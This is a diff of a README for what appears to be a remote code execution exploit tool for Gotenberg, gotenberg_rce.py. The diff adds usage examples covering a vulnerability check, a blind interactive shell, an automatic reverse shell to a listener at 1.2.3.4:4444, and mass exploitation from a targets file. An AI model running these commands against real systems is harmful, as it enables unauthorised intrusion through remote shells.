@@ -139,7 +139,12 @@ python auto_revshell.py -u http://target:3000
 #### Manual IP
 
 ```bash
-python auto_revshell.py -u http://target:3000 --lhost 1.2.3.4 --lport 4444
+  python gotenberg_rce.py -u http://target:3000                    # check only
+  python gotenberg_rce.py -u http://target:3000 -i                 # interactive (blind)
+  python gotenberg_rce.py -u http://target:3000 --rev              # auto reverse shell (auto IP)
+  python gotenberg_rce.py -u http://target:3000 --rev --lport 4444 # auto with custom port
+  python gotenberg_rce.py -u http://target:3000 --rev --lhost 1.2.3.4 --lport 4444
+  python gotenberg_rce.py -f targets.txt --rev --lport 4444 -t 20 -o results.txt
 ```
 
 #### Options
